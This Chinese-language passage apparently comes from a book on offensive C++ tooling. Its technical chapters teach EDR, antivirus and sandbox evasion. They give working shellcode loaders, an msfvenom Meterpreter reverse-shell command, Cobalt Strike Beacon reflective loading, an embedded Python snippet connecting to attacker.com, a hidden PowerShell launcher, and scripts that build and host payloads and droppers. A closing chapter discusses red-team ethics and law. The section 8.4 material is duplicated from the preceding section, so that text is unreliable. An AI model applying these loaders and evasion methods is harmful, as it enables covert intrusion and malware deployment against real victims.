EDR 更难被欺骗。它们钩钩敏感 API 并监控内存分配、线程创建、DLL 注入和网络流量。一种常见的规避策略是 API 卸钩（API unhooking）。由于 EDR 在 `NtOpenProcess` 或 `CreateRemoteThread` 等关键函数的开头放置了跳转板（trampolines），你可以扫描内存中的这些更改，并使用来自干净磁盘镜像或已知 syscall 存根的副本恢复原始指令。

你还可以通过使用手工编写的汇编执行直接系统调用（syscall）来避免受监控的用户态 API。像 `SysWhispers2` 和 `Hell’s Gate` 等工具可以为 Windows 10+ 系统生成这些 syscall 存根，完全绕过用户态钩子。通过直接调用低级 `NT` 函数，你绕过了大多数用户态 EDR 代理程序能看到的内容。

这种技术在实践中看起来如下：

```cpp
typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_t)(HANDLE, PVOID, PVOID, ULONG, PULONG);
NtWriteVirtualMemory_t NtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(ntdll, "NtWriteVirtualMemory");
```

然后你将用一个干净的 syscall 存根替换该指针，避免使用被补丁的版本。

计时也起着作用。如果你知道某个 EDR 解决方案会批量处理日志或在检测方面存在延迟，你可以使用睡眠掩码（sleep masking）——覆盖 `sleep` 函数让你的程序看起来处于空闲状态。你还可以使用线程踏（thread stomping）来劫持良线程（如系统线程）并将你的 shellcode 注入其中，而不是创建一个新线程，因为后者可能会被标记。

另一种规避技术涉及仅在内存中运行，没有任何磁盘足迹。你使用反射性 DLL 加载（reflective DLL loading）、进程空（process hollowing），甚至更高级的方法如通过 NTFS 进行事务文件注入，这从不会将文件完全提交到磁盘，但仍执行它。这里是一个直接从内存加载负载的示例：

```cpp
void* exec = VirtualAlloc(nullptr, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(exec, payloadData, payloadSize);
((void(*)())exec)();
```

有些红队甚至会在内存中修改合法的 Windows 二进制文件并将其作为宿主——例如将代码注入 `wermgr.exe` 或 `svchost.exe`，这些程序很少被拦截。这种被称为进程双生（process doppelgänging）或进程空（hollowing）的策略允许你的负载从签名二进制文件中继承信任。

在实际交战中，这些技术很少孤立使用。相反，采用的是分层方法——首先对负载进行加壳加密，然后动态解析导入，直接调用 syscall，最后注入到受信任的进程中。

重要的是保持每个伪迹都是暂时的。EDR 只能扫描它们能观察到的东西。如果你的代码在内存中解密、执行并自我擦除，你就缩短了暴露时间。当与合法的流量模式以及环境中已有的成品工具相结合时，你可以在间隙中操作——即防御者所谓的“离地攻击”（living off the land）。

## 8.4 沙箱检测与反虚拟机 技巧

当你用 C++ 编写负载、投放器（droppers）或完整的恶意软件时，你面临的最常见早期障碍之一不是杀毒软件签名。一种常见的规避策略是 API 卸钩。由于 EDR 在 `NtOpenProcess` 或 `CreateRemoteThread` 等关键函数的开头放置了跳转板，你可以扫描内存中的这些更改，并使用来自干净磁盘镜像或已知 syscall 存根的副本恢复原始指令。

你还可以通过使用手工编写的汇编执行直接系统调用来避免受监控的用户态 API。像 `SysWhispers2` 和 `Hell’s Gate` 等工具可以为 Windows 10+ 系统生成这些 syscall 存根，完全绕过用户态钩子。通过直接调用低级 `NT` 函数，你绕过了大多数用户态 EDR 代理程序能看到的内容。

这种技术在实践中看起来如下：

```cpp
typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_t)(HANDLE, PVOID, PVOID, ULONG, PULONG);
NtWriteVirtualMemory_t NtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(ntdll, "NtWriteVirtualMemory");
```

然后你将用一个干净的 syscall 存根替换该指针，避免使用被补丁的版本。

计时也起着作用。如果你知道某个 EDR 解决方案会批量处理日志或在检测方面存在延迟，你可以使用睡眠掩码（sleep masking）——覆盖 `sleep` 函数让你的程序看起来处于空闲状态。你还可以使用线程踏（thread stomping）来劫持良线程（如系统线程）并将你的 shellcode 注入其中，而不是创建一个新线程，因为后者可能会被标记。

另一种规避技术涉及仅在内存中运行，没有任何磁盘足迹。你使用反射性 DLL 加载（reflective DLL loading）、进程空（process hollowing），甚至更高级的方法如通过 NTFS 进行事务文件注入，这从不会将文件完全提交到磁盘，但仍执行它。这里是一个直接从内存加载负载的示例：

```cpp
void* exec = VirtualAlloc(nullptr, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(exec, payloadData, payloadSize);
((void(*)())exec)();
```

有些红队甚至会在内存中修改合法的 Windows 二进制文件并将其作为宿主——例如将代码注入 `wermgr.exe` 或 `svchost.exe`，这些程序很少被拦截。这种被称为进程双生（process doppelgänging）或进程空（hollowing）的策略允许你的负载从签名二进制文件中继承信任。

在实际交战中，这些技术很少孤立使用。相反，采用的是分层方法——首先对负载进行加壳加密，然后动态解析导入，直接调用 syscall，最后注入到受信任的进程中。

重要的是保持每个伪迹都是暂时的。EDR 只能扫描它们能观察到的东西。如果你的代码在内存中解密、执行并自我擦除，你就缩短了暴露时间。当与合法的流量模式以及环境中已有的成品工具相结合时，你可以在间隙中操作——即防御者所谓的“离地攻击”（living off the land）。



在真实系统中，这段代码将直接退出。而在调试器中，`int 3` 则会触发断点。

这些技术中的每一种单独可能都不够。沙箱和虚拟机（VM）演进非常快，攻击者需要混合多种检查并微妙地执行它们。其核心思想不是让沙箱直接失效，而是当感觉某些不对劲时静静地退到背景。

最成功的红队载荷能够感知其执行环境并据此采取行动。如果没有检测到用户用户活动、机器具有可疑的固件字符串，或者系统内存太小——那么可能不值得执行该载荷。相反，它可以直接退出、延迟执行或模拟良性行为。

## 8.5 使用真实的 AV 引擎对你的二进制文件进行测试

一旦你用 C++ 编写了恶意软件或红队工具，下一个关键阶段就是理解它面对实际防御系统时的表现。编写一个在实验室有效的载荷是一回事，而了解杀毒软件、端点检测与响应 (`EDR`) 或行为分析引擎是否会立即标记它则是另一回事。

针对真实的 AV 引擎进行测试，可以让你深入了解你的二进制文件的可检测性，以及代码或行为的哪些特定部分被标记。如果你正在构建任何用于红队行动、隐蔽研究或绕过测试的内容，这种反馈是至关重要的。

你首先需要一个安全且合法的环境来进行此类测试。这意味着要在与任何生产网络隔离的离隙虚拟机中工作。该机器应开启快照功能，以便你可以随时恢复到干净状态。你绝对不要在主工作站或共享公司环境中运行潜在有害的代码。

大多数开发者从将他们的二进制文件上传到 `VirusTotal` 开始。虽然它能让你快速获得数十个 AV 引擎检测评分的宽泛概览，但你必须谨慎对待。当你向 `VirusTotal` 上传时，你的二进制文件将与整个杀毒行业共享。这意味着签名、行为和文件哈希可以在几小时内全球分发。`VirusTotal` 非常适合快照测试，但不适用于敏感或私有的载荷。

为了避免泄露私代码，许多红队人员会在虚拟机中设置本地 AV 引擎。例如，你可以在恶意软件分析实验室中安装 `Windows Defender`、`Avast` 或 `Bitdefender` 并直接测试你的代码。这让你能够观察静态签名扫描是在磁盘访问期间捕获了文件，还是仅在运行时通过行为分析被标记。

测试你的二进制文件的一种方法是将其复制到虚拟机并尝试执行它。如果它被隔离或删除，则检测可能是静态的。如果它执行但稍后被拦截，则检测是行为型或启发式的。你可以在多次构建之间调整代码并学到很多。例如，更改函数的控制流、重命名字符串或分解内存分配模式可能会极大地改变结果。

这是一个实用的练习。从一个非常基本的 C++ 反向 shell 载荷开始，也许使用 `WinExec` 或 `CreateProcessA` 来生成 `cmd.exe`。一旦你确认该载荷被 `Windows Defender` 标记，就开始修改其行为。尝试使用间接函数调用、`XOR`-编码的命令字符串或基于堆的 shellcode 执行，而不是直接使用系统调用。测试每个构建版本，记录哪些技术绕过了引擎，并将这些结果与你做的更改关联起来。

这是一个简单的 C++ 示例，它会触发 Defender 报警：

```cpp
#include <windows.h>

int main() {
    WinExec("cmd.exe whoami", SW_HIDE);
    return 0;
}
```



使用 Metasploit 的工作流通常始于使用 `msfvenom` 生成原始机器码（shellcode）。该 shellcode 可以直接嵌入到 C++ 二进制文件中，该文件负责分配内存、将负载荷（payload）写入内存并跳转到入口点。让我们来看看它是如何实现的。

首先，使用 `msfvenom` 生成一个 Meterpreter 反向 shell 负载荷，并以兼容 C 语言的格式输出：

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c
```

此命令会返回一个很长的字节值数组。你在 C++ 中的任务是将此数组嵌入到二进制文件中，然后动态分配内存，将 shellcode 复制到其中，并使用函数指针执行它。

在实践中，你的 C++ 代码可能看起来像这样：

```cpp
#include <windows.h>
#include <iostream>

unsigned char payload[] = {
0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, ... // 省略的 msfvenom shellcode
};

int main() {
    void* exec = VirtualAlloc(0, sizeof(payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, payload, sizeof(payload));
    ((void(*)())exec)();
    return 0;
}
```

这种模式在红队行动和恶意软件工程中非常常见。使用 `VirtualAlloc` 可以提供可执行内存，而函数指针转换允许你直接跳转到负载。虽然 shellcode 只是机器指令，但从 CPU 的角度来看，它的行为就像任何其他合法的函数指针调用。

一旦 Metasploit 监听器配置好对应的 IP 和端口，该二进制文件在目标系统上成功运行后就会接收你的 Meterpreter 会话。

现在，当使用 Cobalt Strike 时，原理是类似的，但负载通常以 Beacon 引导程序（stagers）或全阶段 DLL 的形式交付。Cobalt Strike 的 Beacon 经常以反射方式（reflectively）交付。这意味着你需要构建 C++ 代码来支持从内存中加载 DLL 并手动调用其入口点。

与其将 Beacon 编译为 EXE，不如将其编译为反射型 DLL，并让你的 C++ 加载器处理其余工作。你将 Beacon 二进制文件读入内存，解析其 PE 头，为节区分配空间，将其复制到内存中，处理重定位和导入表修复，然后手动调用 `DllMain`。Cobalt Strike 提供了用 C 编写的反射加载器模板，但你可以用 C++ 重新实现它们以获得更好的结构和可读性。

简化的方法涉及将整个 DLL 读取到内存，然后使用 `LoadLibraryA` 技巧或使用如 `pe-parse` 等 PE 加载库，或者编写自己的库来手动处理加载。第二种方案可以提供更好的隐蔽性和绕过能力，因为 Windows 完全不知道加载了该 DLL——它从未接触磁盘，也从未使用 Windows 加载器。

以下是你的加载器可能包含的概要草图：

- 一个接受代表 Beacon DLL 的字节数组和大小的函数
- 为头部和节区分配内存
- 手动修复重定位和导入项
- 使用相应的标志调用 DLL 入口点

还有将你的 Beacon shellcode 作为原始字节嵌入的选项，使用之前展示的相同执行技巧。你可以从 Cobalt Strike 控制台通过 `stage` 命令配合 `artifact` 生成此 shellcode，或者使用导出 Beacon 负载的 Aggressor 脚本。

对于 Metasploit 和 Cobalt Strike，关键在于能够构建出可靠且静默加载的负载荷，使其符合框架的预期，并通过 AV/EDR 防御。这正是 C++ 的用武之处：它赋予了你规避检测所需的控制力，同时保持与原始 shellcode、反射型 DLL 以及完全自定义的二进制加载器的兼容。

为了进一步提升你的技能，你可以整合如加密 shellcode、编码 API 调用或随机化节区名称和头部等技术。这些战术帮助你领先于基础的基于特征的检测，尤其是当你目标是具有活跃端点监控的级级系统时。

在红队行动中，此类负载荷通常在钓鱼攻击、路过下载或横向移动中释放。因此，它们必须是小巧、稳定且可靠的。用 C++ 编写它们赋予了你底层能力来使这一切成为可能，特别是当与 Metasploit 和 Cobalt Strike 等框架配合使用时。

这种集成让你的攻击性工具开始产生现实价值——它们不仅是实验，更是插入到全球行动中使用的专业基础设施的可靠植入物。

## 9.2 自定义加载器与引导程序（Loaders and Stagers）

在攻击性安全中，自定义加载器和引导程序是负载荷交付的无名支柱。如果你正在构建恶意软件、红队工具，或者只是在学习攻击者如何将代码嵌入内存并执行而不触发警报的机理，那么理解如何在 C++ 中设计‌‌设计并实现你自己的加载器和引导程序是一项基础技能。

加载器（Loader）负责获取嵌入或远程负载荷（通常以 shellcode 或编译后的 DLL 形式存在）并为执行做准备。另一方面，引导程序（Stager）是一个短小轻量级的代码，作为大型负载的第一阶段。它的工作是连接到远程服务器或检索额外的阶段，这些阶段通常功能更强，但也更大、更复杂。

让我们从一个经典场景开始：你有一个由 Metasploit 或 Cobalt Strike 生成的 C2 shellcode 负载荷。与其将其直接写入一个容易被杀毒软件扫描和标记的文件，你希望将该负载荷嵌入到自己的 C++ 程序中，并让它看起来像一个普通的程序。

加载器需要分配内存，将负载荷复制到其中并执行。这是一个用 C++ 编写的简单 shellcode 加载器示例。假设你已经将 shellcode 生成并存储在数组：

```cpp
#include <windows.h>
#include <iostream>

unsigned char shellcode[] = {
0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, // shellcode 字节在此
};

int main() {
    void* exec_mem = VirtualAlloc(nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec_mem, shellcode, sizeof(shellcode));
    ((void(*)())exec_mem)();
    return 0;
}
```

这个极简加载器负责设置内存并运行你的 shellcode。然而，这种简单性可能是它的致命点。像 EDR（端点检测与响应）之类的防御工具经过训练可以识别分配具有执行权限的内存或调用非模块内存区域的行为。这就是为什么真实世界的加载器会添加混淆、加密，甚至延迟到用户交互后执行的原因。

现在，让我们转向引导程序（Stagers）。这里的想法是减少初始负载荷的足迹。引导程序的工作是连接到你的服务器，下载实际负载荷，对其解密并在运行时执行它。这种分阶段交付在你试图保持恶意软件或植入物短小，或者你需要在不重新编译整个加载器的情况下动态切换负载荷时特别有用。

一种常见的引导程序方法是使用原始接字从服务器获取远程二进制块。一旦接收，该块将在内存中执行而不写入磁盘。你可以使用 Windows 套字（`WSAStartup`, `socket`, `connect`, `recv`）建立此连接，然后使用 `VirtualAlloc` 来存储并运行代码。

以下是其工作原理的概念草图：

- 引导程序连接到特定 IP 和端口的远程服务器
- 下载块加密的 shellcode 或 DLL 字节
- 使用简单的 XOR 或 AES 算法对该负载荷进行解密




- 它分配了具有执行权限的内存
- 它直接在内存中运行有效负载

这种方法不仅有效，而且模块化。你可以更新服务器来更改有效负载或更换加密密钥，而无需更改 stager 二进制文件本身。

在真实的红队行动中，你可能会使用 `HTTPS` 或 `DNS 隧道` 来获取有效负载，而不是使用原始套接字。你还可以伪装流量，使其看起来像是对 Google 或微软域的合法 API 调用。但从本质上讲，stager 的目的仍然是保持小巧、保持静默，并确保繁重的工作由后续阶段完成。

让 `C++` 成为这项任务的强大语言的原因是，它能够直接访问系统调用和原生 API。与脚本语言不同，`C++` 同时提供了低级内存控制和高层结构化能力，因此你的 loader 可以既整洁、快速又易于自定义。

在实践中，loader 还可以集成反调试检查、用于单例行为的互斥锁创建、沙箱检测和延迟执行。这些特征不仅支持有效负载交付——它们还提高了韧性和隐蔽性，使防御者更难对你的二进制文件进行逆向工程或分析。

理解 loaders 和 stagers 的工作原理并构建你自己的，不仅仅是一项技术练习。它是攻击性 `C++` 编程中最实用的技能之一，在处理框架、规避战术和后渗透工具时，它将为你带来巨大的优势。

## 9.3 使用 PowerShell 和 Python 桥接的混合有效负载

在某些情况下，用 `C++` 编写整个有效负载并不理想。有时，你既想要 `C++` 的性能和低级访问能力，又想要 `PowerShell` 或 `Python` 等语言的灵活性和脚本化。在这些情况下，构建混合有效负载——即你的 `C++` 代码启动、嵌入或与 `PowerShell` 或 `Python` 交互——可以兼得两者之。

攻击者和红队经常使用混合有效负载的原因很简单。`PowerShell` 已经深度集成到 Windows 中，而 `Python` 在类 Unix 系统或开发机上很常见。当你将这些内容嵌入到 `C++` 包装器或启动器时，你可以在降低可疑的同时增加成功执行的概率。

让我们来看一个实际场景：你有一个 `PowerShell` 脚本，它使用内置 Windows API 获取凭据或与 `LSASS` 交互。你不想在磁盘上释放 `.ps1` 文件，因为那很容易被发现。相反，你可以编译一个 `C++` 二进制文件，在内存中启动 `PowerShell` 并将脚本作为字符串传递给它。

这是一个简单的 `C++` 示例，它通过 `powershell.exe` 调用 `PowerShell`，执行命令且不在磁盘上留下任何东西。

```cpp
#include <windows.h>
#include <iostream>

int main() {
    const char* psCommand = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Get-Process | Out-File -FilePath C:\\temp\\proc.txt\"";
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    if (CreateProcessA(
        nullptr,
        (LPSTR)psCommand,
        nullptr,
        nullptr,
        FALSE,
        CREATE_NO_WINDOW,
        nullptr,
        nullptr,
        &si,
        &pi
    )) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    } else {
        std::cerr << "Failed to launch PowerShell." << std::endl;
    }
    return 0;
}
```

此有效负载将在不弹出窗口的情况下运行 `PowerShell` 命令。你可以将 `psCommand` 替换为编码或混淆过的 `PowerShell` 以增加隐蔽性。一种流行的方法是对你的 `PowerShell` 进行 base64 编码并使用 `-EncodedCommand` 参数传递它。

你可以使用 `Python` 进一步扩展这一概念。假设你有一个 `Python` 脚本，使用 `socket`、`os` 或 `subprocess` 模块创建反向 shell。与其要求受害者机器上预安装 `Python`，不如让 `C++` loader 直接嵌入 `Python` 解释器。

`Python` 的官方 `Python.h` `C API` 允许你从 `C++` 运行 `Python` 代码。如果你用 `Python` 库静态编译你的 `C++` 应用程序，你完全不需要依赖系统的安装。

这是一个运行嵌入式 `Python` 代码的基础 `C++` 示例：

```cpp
#include <Python.h>

int main() {
    Py_Initialize();
    const char* pythonCode = R"(
import socket
s = socket.socket()
s.connect(('attacker.com', 4444))
s.send(b'Connected')
s.close()
)";
    PyRun_SimpleString(pythonCode);
    Py_Finalize();
    return 0;
}
```

这会在内存中启动 `Python` 并执行嵌入的反向 shell 逻辑。你可以使用本地 `Python` 开发环境（例如来自 `Anaconda` 捆绑或嵌入式 `Python` 构建）编译此代码并链接到你的可执行文件。在 Linux 上，你使用 `-lpython3.x` 链接；在 Windows 上，使用 `Python` 安装目录提供的 `.lib` 文件。

混合有效负载还允许链式：`C++` dropper 运行 `PowerShell`，后者下载 `Python` 脚本，脚本调用编译后的共享库。这种分层方法使得检测变得困难，特别是当没有任何组件被释放到磁盘且执行完全在内存中进行时。

在实际操作中，这种多语言设计允许红队复用开源工具。许多凭据窃取工具、横移动工具和域名枚举工具都是用 `Python` 或 `PowerShell` 编写的。将它们封装在 `C++` 二进制文件中让你控制执行、混淆和交付。

同样重要的是，混合有效负载让你能够适应环境。在某些机器上，`PowerShell` 可能受到严格限制；在另一些机器上，`Python` 可能缺失。通过在有效负载中支持多种桥接，你增加了代码执行和后渗透执行的可能性。

## 9.4 有效负载生成与部署自动化

当你经常构建有效负载时——无论是为了红队、漏洞开发还是渗透测试——手动操作一切很快变得枯燥且容易出错。编写代码、编译、嵌入 shellcode、设置交付机制并将有效负载部署到目标可能涉及许多重复步骤。自动化消除了瓶颈，减少了错误，并让你更容易高效地扩展攻击行动。

为了自动化 `C++` 的有效负载生成，你首先需要一种一致的方法来嵌入 shellcode，或根据用户定义的参数动态生成有效负载。假设你正在嵌入反向 shell shellcode，或者根据目标平台或架构使用模板。与其每次都将十六进制值复制到 `C++` 源中，你可以创建一个构建脚本，从文件读取原始二进制 shellcode 并生成 `.cpp` 或 `.h` 文件。

一个小型 `Python` 脚本可以帮助将 shellcode 转换为 `C++` 语法。这是一个基础示例：

```python
shellcode = open("reverse_shell.bin", "rb").read()
formatted = ", ".join("0x{:02x}".format(b) for b in shellcode)
with open("shellcode_payload.h", "w") as f:
    f.write(f"unsigned char payload[] = {{ {formatted} }};\n")
    f.write(f"unsigned int payload_len = {len(shellcode)};\n")
```

你可以将此头文件直接包含在负载源码中编译，而无需手动触摸有效负载。此过程也更容易集成来自 `Metasploit`、`msfvenom`、`Cobalt Strike` 或你自定义工具的 shellcode 输出。





例如，在基于 Linux 的构建机器上的 Bash 脚本可以：

● 使用 `g++` 或 `clang++` 构建 C++ 载荷
● 使用 `strip` 去除调试符号
● 使用自定义脚本对字符串进行混淆
● 将最终的二进制文件移动到 Web 服务器目录以供下载
● 记录时间和载荷哈希值以便追踪

这里是一个简化的示例：

```bash
#!/bin/bash

g++ -O2 -fPIC -o payload payload.cpp

strip payload

python3 obfuscate_strings.py payload

cp payload /var/www/html/payloads/

sha256sum payload >> deployment_log.txt
```

当你将此流程集成到版本控制（例如 `Git`）并添加 `CI`风格的钩子时，你的载荷构建和交付流水线就会像专业软件工程一样顺畅。

对于红队行动或攻防模拟，自动化部署可能还此类技术，如通过邮件载荷、生成嵌入载荷的恶意文档，或编写下载并执行你编译代码的单行下载程序（droppers）。你可以使用模板生成这些下载程序，并根据当前操作的阶段环境动态注入 IP 地址和端口等变量。

管理这种复杂性的实用方法是使用基于 Python 的 `jinja2` 模板自动化。你可以编写一次载荷模板，并使用脚本根据需要生成带有特定环境数据的载荷。这里有一个简化的示例：

```python
from jinja2 import Template

template = Template(open("dropper_template.ps1").read())

payload = template.render(ip="10.0.0.5", port="4444")

with open("dropper.ps1", "w") as f:
    f.write(payload)
```

无论你是生成 `PowerShell`、`C++`、`VBA` 宏还是 `HTA` 文件，同样的都适用。自动化确保了一致性、速度和适应性。

最终，自动化载荷的生成和部署不仅节省了时间，还降低了风险。通过将人类从重复敏感的步骤解放出来，你可以避免配置错误、遗忘以及跨构建的不一致性。无论你是模拟复杂的威胁者，还是为可重复的红队演练构建工具，这种控制力都会成为一种竞争优势。

在高风险环境中，即使是忘记一个编译器标记或放错载荷文件这种小事也可能导致行动失败。自动化确保了这种情况不会发生。通过良好的配置，你可以在几秒钟从一个可行的原型转变为部署在目标网络上的二进制文件，并拥有完整的审计日志和随时随地重新生成一切的灵活性。

# 第 10 章 负责任的使用、伦理与法律边界

在整本书中，你探索了使用 `C++` 推向攻击性安全可能极限的各种技术。你学会了如何构建工具、编写 shellcode、规避检测以及利用漏洞。但所有这些都不应脱离一个核心语境：责任。破坏或绕过系统的力量也伴随着以伦理、合法且专业的方式使用该力量的绝对要求。

当你编写红队工具或攻击性安全代码时，你通常工作在灰色地带，你的意图和授权比代码本身更。误用——即使是无意的——也会对个人、企业和整个基础设施造成真实伤害。因此，让我们清晰、诚实地审定义专业攻击性安全工作的伦理和法律责任。

## 10.1 红队伦理与授权

在你编写第一行模拟攻击的代码之前，在你将载荷注入内存之前或设计网络钓鱼活动之前，你必须问自己的第一个问题是：我有许可吗？不是隐含的许可。不是“他们可能预料到了”。而是真实的、明确的、有记录的授权。

红队测试是专业的攻击性安全。你正在模拟对手的战术，但唯一的区别在于——你是在合同范围内、在约定的边界内执行。如果没有明确设定这些边界，你所做的不是红队测试，而是未经授权的访问。在许多司法管辖区，这是犯罪行为。

当一个组织聘用红队时，他们信任你能够表现出纪律、审慎和诚信。这种信任绝不能轻视。你的任务不是破坏东西。你的任务是以受控的方式揭示风险，以便组织在他人利用它之前修复它。这种心态必须带入你所做的每件事中，从基础设施测试到恶意软件开发。

适当的行动始终始于工作范围（SOW）和一份签署的《作战规则》（Rules of Engagement）文档。该范围定义了你允许测试哪些系统、允许使用哪些技术以及在什么条件下进行。有时，物理攻击是不在范围内的。其他时候，你可能被限制针对某些生产服务器，或者被要求在触发某些指示时通知联系人。

你还被要求定义你的退出标准——什么标志着目标已完成，以及你将如何清理现场。一个优秀的红队不会留下任何碎片、运行中的进程或可能在稍后损害业务运行的文件痕迹。如果你在测试中投放了恶意软件或加载器，你必须准备好在行动结束时移除它的每一个字节。

让我们谈谈工具开发背景下的授权问题。假设你正在为客户的红队评估创建一个 `C++` 编写的反向 shell。它通过 `HTTPS` 进行出站连接并允许完全的远程控制。这本身是一个强大的工具但也是一个危险的工具。如果你在不属于客户的基础设施上测试它，或者如果你的命令与控制（C2）服务器托管在未监控的环境中，你就是在未经许可的情况下制造风险。

为了安全工作，请务必在受控实验室中测试。使用已知安全的 IP。设置日志和告警。如果你作为大型安全公司红队的一部分工作，请与你的法律和合规部门协调。你应该清楚你所触的每一个系统的所有者，并拥有签署的文件证明你的活动是预期且允许的。

现在考虑许可之外的伦理。仅仅因为某事是被允许的，并不意味着它是负责任的。例如，利用一个导致生产系统重启的漏洞在技术上可能是范围内——但如果你知道该系统控制着安全设备或公用事业，按下触发机是一个绝不应轻率的决策。

这就是红队成熟度的体现之处。业余者测试他们被允许测试的一切。专业人士根据潜在影响决定不测试什么，即使在授权的情况下。他们理解负责任的黑客不仅意味着法律安全，还意味着考虑现实世界的后果。

让我们将其投入一个实际示例。假设你正在编写一个 `C++` 加载器，将载荷注入目标应用程序。你已经在实验室中进行了彻底测试，现在是时候在行动中部署了。但该目标运行处理金融交易的软件。你的加载器在注入期间会导致短暂的波动。如果这种波动延迟了交易处理，可能会影响客户或合规性。

在这种情况下，你应该停止。联系客户负责人。询问：“这种战术是允许的，但这是可能的影响。你是否同意我们继续，或者你更倾向于使用替代方案？”这不仅是良好的沟通，这是伦理上的专业表现。

伦理还延伸到披露。如果你发现了一个不在测试计划内的关键漏洞——可能在客户使用的第三方应用程序中——你仍然应该报告它。安静地。负责任地。记录你的发现，并在问题公开之前给供应商一个修复的机会。你不要将其武器化。你不要将其留作自用。




最后，请意识到你的行为带来的文化和心理影响。钓鱼用户、模拟社会工程学或冒充高管，如果操作不当，可能会导致压力、困惑或尴尬。请务必与人力资源部门或法律部门合作，编写尊重员工的信息。你的工作不是为了抓别人犯出的错。你的工作是帮助企业发现其防御——以及培训——哪里可以加强。

红队伦理不仅关乎不伤害，更关乎是否值得信任。雇佣你的组织给了你攻击者梦寐以求的访问权限。他们期望你以谨慎、智慧和克制来处理这些权限。

## 10.2 法律框架 (CFAA, GDPR 等)

如果你正在开发攻击性安全工具或进行红队行动，了解法律不是可选项的，而是至关重要的。当你工作在法律与犯罪的边界边缘时，任何一步失误都可能导致诉讼、合同丢失，甚至刑事指控。因此，让我们清晰、直接地讨论规范黑客活动和数字侵入的法律框架，特别是在红队行动和恶意软件开发的背景下。

在美国，你需要了解的基础性法律之一是《计算机欺诈与滥用法》，简称 `CFAA`。它于 1986 年通过，至今仍在使用有效执行。该法律将未经授权访问计算机和网络的行为定为犯罪。这里的关键词是“未经授权”。如果你在没有获得明确许可的情况下访问了系统，即使你是为了演示漏洞，也可能违反了联邦法律。

现在，法律意义上的“未经授权”意味着什么？在实际操作中，这意味着系统所有者没有给你提供书面许可。不是口头批准。不是假设性许可。而是真实的书面授权。例如，如果你扫描的是一个不在你的任务范围内的 IP 范围——即使它属于同一家公司的网络——`你就踏入了非法领域。` `CFAA` 不区分主意图和坏结果。它只关乎你本不该出现在那里。

`CFAA` 已被用于起诉从外部黑客到访问了不该访问数据的内部人员的各种人员。它的描述足够模糊，以至于受到安全研究人员和民权组织的批评。尽管如此，就现状而言它就是法律，在开发攻击性工具的每个阶段，你都需要考虑到它并进行操作。

如果你在欧洲运营或处理属于欧盟公民的数据，那么《通用数据保护条例》（`GDPR`）就变得至关重要。`GDPR` 不仅仅关于数据泄露——它关乎个人数据的如何收集、存储、处理和传输。在 `GDPR` 下，未经授权访问个人数据——即使是为了测试——也可能被视为严重违规。

假设你正在用 `C++` 写一个用于内部测试的记录器。如果该记录器不小心捕获了员工或客户的凭据、银行信息或可识别的个人数据，你现在受到 `GDPR` 的约束——即使你的意图是帮助组织保护其端点。`GDPR` 特别强调同意、必要性和最小化。因此，如果你的工具收集的数据比需要的多，或者保留数据的时间超过了必要范围，你就可能制造了法律风险。

另一个值得了解的法律是《数字千年版权法案》（`DMCA`），特别是第 `1201` 节。它禁止绕过访问控制机制，即使你拥有相关的设备或系统。如果你正在构建绕过数字版权管理 (`DRM`) 或身份验证例程序的工具——即使在研究背景下——除非有特定的豁免，否则你可能违反了 `DMCA`。

进入企业环境后，许多组织要求红队行动与内部法律和合规框架保持。例如，上市公司通常受《萨班斯-奥克斯利法案》（`SOX`）的约束，这影响了日志和审计跟踪必须如何保存。如果你的恶意软件或 Shellcode 在红队行动期间禁用或操纵了日志机制，你可能会干扰受法律保护的记录。

你还需要意识到合同法。每一项任务都受法律协议的约束——工作说明书、保密协议 (`NDAs`) 和服务合同。这些文件定义了你被允许做什么以及明确被禁止做什么。违反这些规定不仅是不专业的——还可能违反合同条款，导致损害赔偿责任或违反信任。

然后是国际法。如果你的载荷（payload）连接到测试发生地以外的服务器，你可能受到两个国家法律的约束。例如，在一个具有严格数据留存的国家启动 `C2` 服务器，然后用它来收集另一个司法管辖区客户的测试数据，可能会触犯跨境数据传输的规定。

这是一个真实的场景。红队构建了一个 `C++` 反向 Shell 载荷并在公司内部网络中进行测试。一切进展顺利，但一名操作员误将其投向一个由第三方供应商托管在云端的备份环境。该云系统未列在范围内。尽管数据属于同一家公司，但基础设施并不属于，于是供应商提了投诉。这支红队现在为他们自己和客户都制造了法律风险。

最安全的方法始终是透明和记录。以书面形式获取你的任务范围。准确定义具体哪些系统、用户和工具参与了其中。记录一切。如果你在范围之外发现了关键内容，请停止并上报。那一刻的谨慎可以为你省掉数小时的法律麻烦，并保护你与客户的关系。

在这个领域工作不仅需要技术技能——还需要法律意识和克制。你不只是在写代码。你正在由几十年立法和法院判决塑造的法律环境中工作。理解这个环境是你工作的一部分，它也是专业人士与投机者之间的区别。

如果你有任何疑问，不要做假设。咨询你的法律团队、客户或专业的技术律师。




假设你正在测试一个键盘记录器或 shellcode 加载器。如果没有受限的环境，同样的代码可能会开始记录你自己的凭据，或向活动服务器发送信标（beaconing）。如果你正在编写包含真实有效负载（payload）执行的概念性恶意软件，绝对不要在连接到互联网的系统上运行，除非你正在使用环回（loopback）或安全的模拟端点（mock endpoints）。无意向公共 IP 或 C2 服务器发送信标——即使是为了测试目的——也可能触发入侵检测警报，或引起你的 ISP 或托管提供商的严重关注。

如果你正在模拟规避杀毒软件或沙箱检测，你的测试环境应该复制真实世界的限制。这意味着要模拟常见的软件配置，并允许某些杀毒软件（AV）或 EDR 工具运行。例如，在隔离的虚拟机中向 `explorer.exe` 注入代码可以让你了解真实防御是如何运行的，而无需危及你的宿主机。

